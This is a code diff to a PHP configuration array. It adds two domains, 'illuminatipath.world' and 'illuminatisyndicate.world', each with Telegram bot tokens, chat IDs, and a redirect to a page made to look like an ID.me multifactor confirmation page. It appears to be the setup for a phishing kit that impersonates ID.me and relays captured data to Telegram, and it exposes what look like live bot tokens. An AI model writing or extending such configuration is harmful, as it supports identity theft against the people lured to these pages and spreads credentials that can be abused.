@@ -59,6 +59,27 @@ $site_map = [
     ],
 
 
+    'illuminatipath.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8573585719: AAH3nsPej6dsiVQke8r2EmVoOR18rWz8C1c', 'chat_id' => '7207169369'],
+        ],
+        "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php"
+    ],
+
+
+
+
+    'illuminatisyndicate.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
+        ],
+        "redirect" => "https://illuminatisyndicate.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php"
+    ],
+
+
+
 
 ];
 
